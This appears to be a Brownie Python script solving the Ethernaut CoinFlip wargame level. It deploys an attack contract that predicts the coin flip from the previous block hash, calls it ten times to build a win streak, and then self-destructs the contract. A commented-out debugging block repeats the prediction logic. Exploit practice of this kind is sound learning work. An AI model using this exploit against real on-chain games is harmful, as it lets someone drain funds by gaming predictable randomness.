#!/usr/bin/python3
from brownie import Attack, interface
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


# * Rinkeby address : 0xFD7a732ca213EF549696c875c2A33b400a7B5609

FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968


def guessFlip(contract_address=None, attacker=None):
    # ? getting the contract
    if not contract_address:
        # from web3 import Web3

        # w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
        coinflip_contract, owner = deploy()
        contract_address = coinflip_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    else:
        # from web3.auto.infura import w3

        coinflip_contract = interface.CoinFlip(contract_address)

    coinflip_attack = Attack.deploy(coinflip_contract, {"from": attacker})
    print(
        f"{green}Attacking contract deployed at: {magenta}{coinflip_attack.address}{reset}"
    )
    print(f"{red}Let's win this game!!{reset}")
    for _ in range(10):
        tx = coinflip_attack.attack(
            {"from": attacker, "gas_limit": 100000, "allow_revert": True}
        )
        tx.wait(1)
        # print(f"Current Win Streak: {coinflip_contract.consecutiveWins()}")
    print(f"{green}Final Win Streak: {red}{coinflip_contract.consecutiveWins()}{reset}")
    coinflip_attack.selfDestruct({"from": attacker})

    """
    print(contract_address)
    # ? variables
    block_num = w3.eth.block_number
    block_value = w3.eth.get_block(block_num - 1)["hash"].hex()
    # print(block_num)
    print(block_value)

    #! for local testing
    block_value = w3.eth.get_transaction_by_block(block_num - 1, 0)
    block_value = "0xFD7A732CA213EF549696C875C2A33B400A7B5609"
    block_value = w3.eth.get_block(block_num - 1)
    block_value = w3.eth.get_transaction_by_block(block_num - 1, 0)["blockHash"].hex()

    print(block_value)
    print(w3.eth.get_block(block_num - 1)
    exit(1)

    coin_flip = int(int(block_value, 0) / FACTOR)
    side = (lambda: True, lambda: False)[coin_flip == 1]()
    print(coin_flip)
    print(side)
    exit(3)
    """


def main(contract_address=None):
    if contract_address:
        guessFlip(contract_address, get_account())
    else:
        guessFlip()
